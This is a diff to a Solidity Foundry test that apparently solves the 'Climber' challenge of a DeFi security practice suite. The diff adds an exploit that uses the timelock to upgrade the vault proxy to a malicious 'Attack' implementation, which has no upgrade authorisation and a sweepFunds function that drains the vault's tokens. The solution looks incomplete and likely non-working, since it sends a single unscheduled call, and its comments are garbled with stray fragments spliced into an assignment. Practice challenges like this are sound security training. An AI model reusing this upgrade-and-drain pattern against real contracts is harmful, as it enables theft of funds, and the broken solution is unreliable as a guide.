@@ -4,9 +4,21 @@ pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
 import {ClimberVault} from "../../src/climber/ClimberVault.sol";
-import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
-import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
+import {
+    ClimberTimelock,
+    CallerNotTimelock,
+    PROPOSER_ROLE,
+    ADMIN_ROLE
+} from "../../src/climber/ClimberTimelock.sol";
+import {
+    ERC1967Proxy
+} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
+import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import {
+    UUPSUpgradeable
+} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
 
 contract ClimberChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -43,7 +55,10 @@ contract ClimberChallenge is Test {
             address(
                 new ERC1967Proxy(
                     address(new ClimberVault()), // implementation
-                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
+                    abi.encodeCall(
+                        ClimberVault.initialize,
+                        (deployer, proposer, sweeper)
+                    ) // initialization data
                 )
             )
         );
@@ -85,7 +100,23 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
-        
+        address[] memory targets = new address[](1);
+        // targets[0] = address(timelock);
+        targets[0] = address(vault);
+        uint256[] memory values = new uint256[](1);
+        values[0] = 0;
+        // values[1] = 0;
+        Attack attack = new Attack();
+        bytes[] memory dataElements = new bytes[](1);
+        dataElements[0] = // ), //     ClimberTimelock.grantRole(keccak256("PROPOSER_ROLE"), player) // abi.encodeCall(
+        abi.encodeCall(UUPSUpgradeable.upgradeToAndCall, (address(attack), ""));
+        // dataElements[1] = abi.encodeCall(
+        //     AccessControl.grantRole(keccak256("PROPOSER_ROLE"), player)
+        // );
+
+        bytes32 salt = keccak256("salt");
+
+        timelock.execute(targets, values, dataElements, salt);
     }
 
     /**
@@ -93,6 +124,22 @@ contract ClimberChallenge is Test {
      */
     function _isSolved() private view {
         assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
-        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
+        assertEq(
+            token.balanceOf(recovery),
+            VAULT_TOKEN_BALANCE,
+            "Not enough tokens in recovery account"
+        );
+    }
+}
+
+contract Attack is UUPSUpgradeable {
+    function _authorizeUpgrade(address newImplementation) internal override {}
+
+    function sweepFunds(address token, address recovery) external {
+        SafeTransferLib.safeTransfer(
+            token,
+            recovery,
+            IERC20(token).balanceOf(address(this))
+        );
     }
 }
